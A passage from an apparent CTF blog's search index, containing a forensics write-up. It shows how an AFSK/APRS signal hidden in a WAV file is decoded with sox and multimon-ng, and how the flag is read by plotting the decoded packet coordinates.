luck, that can be done with going to <code>Tools --&gt; I/Q Recoder --&gt; Specifying the absolute path to our file</code> .</p><p><img src="/../images/dante/start1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>This was something we were for sure looking for ! If there was one thing I learned from playing <code>CTFs</code> is always to be very patient while doing these type of challenges, and to no surprise after a few minutes I spotted a curly closing brace <strong>}</strong> which hints that other parts of the flag are to come.</p><p><img src="/../images/dante/br.png" alt="C0ULD N0T B3 L04AD3D"></p><p>By waiting for about 3-4 minutes,I ended up putting the pieces of the flag together character by character.In the end we got the <em>flag</em> and the first blood 🩸!</p><h1 id="Almost-Perfect-Remote-Signing"><a href="#Almost-Perfect-Remote-Signing" class="headerlink" title="Almost Perfect Remote Signing"></a>Almost Perfect Remote Signing</h1><p><img src="/../images/dante/chall2.png" alt="Challenge"></p><div class="note note-danger">            <p><strong>Difficulty:</strong> <strong>Hard</strong><br><strong>Category:</strong> <strong>Forensics</strong><br><strong>Flag:</strong> <strong><code>DANTE{FLAG_REPORTING_SYSTEM}</code></strong></p>          </div> <p>In this challenge, we are given a <code>.wav</code> file with the flag hidden somewhere inside it. Listening to the file yields nothing but ~8 seconds of what sounds like static noise, so we know the flag is encoded inside the sound data somehow. Running the file through steg tools like <strong>Binwalk</strong> and <strong>WavSteg</strong> doesn’t reveal much, and LSB analysis doesn’t show any signs of the image being encoded in the bits of the file. At this point, I opened the file in <code>Sonic Visualiser</code> to see what secrets may be encoded in the spectrogram or frequency information of the sound data. Examining the spectrogram, I saw something interesting:</p><p><img src="/../images/dante/spec.png" alt="C0ULD N0T B3 L04AD3D"></p><p>There is a faint binary signal present in the spectrogram! This discovery led me to think that the flag was encoded in the sound data in binary manner somewhow (using 0’s and 1’s). Being a novice in the area of digital signal processing, I had to do a significant amount of research to determine how this is achieved - via <a href="https://en.wikipedia.org/wiki/Frequency-shift_keying">AFSK</a> (Audio Frequency Shift Keying). In this protocol, binary data is modulated onto a continuous analog signal for long-distance transmission (e.g., radio). To decode this manually would be a real hassle, so I looked up tools to automate the process. After trying and failing with tools like <strong>GnuRadio</strong>, I stumbled upon <a href="https://www.kali.org/tools/multimon-ng/">multimon-ng</a>. This tool will demodulate the signal and output the encoded data automatically, as long as it knows the exact protocol being used. There are several AFSK protocols to choose from:</p><p><img src="/../images/dante/proto.png" alt="C0ULD N0T B3 L04AD3D"></p><p>And I ended up choosing AFSK1200 to start with (which turned out to be the right choice!).<br>This tool requires the <code>.wav</code> file to be in <code>.raw</code> format, which can be achieved using sox:</p><p><strong><code>sox -t wav aprs_out.wav -esigned-integer -b16 -r 22050 -t raw aprs_out.raw</code></strong></p><p>This command essentially takes the wave file and converts it to <code>.raw</code> format. Notice the sampling rate of 22050Hz being used here, which is the standard for these types of radio transmissions. Once this is done, we can use <strong>multimon-ng</strong> to decode the signal:</p><p><strong><code>multimon-ng -t raw -a AFSK1200 aprs_out.raw &gt; flag</code></strong></p><p>After doing those steps the decoded data looks something like this.</p><p><img src="/../images/dante/decoded.png" alt="C0ULD N0T B3 L04AD3D"></p><p>We are definitely on the right track - we can see “Hello flag!” in every packet. If we scrutinize the data closely, we can see that there are slightly different coordinates used in each packet transmission:</p><p><img src="/../images/dante/decoded2.png" alt="C0ULD N0T B3 L04AD3D"></p><p>Is the flag encoded in these coordinates somehow? Plotting these coordinates on a Cartesian coordinate system yields:</p><p><img src="/../images/dante/plane.png" alt="C0ULD N0T B3 L04AD3D"></p><p>It’s not pretty, but zooming in around small groups of characters can help us read the flag characters:</p><p><img src="/../images/dante/plane2.png" alt="C0ULD N0T B3 L04AD3D"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
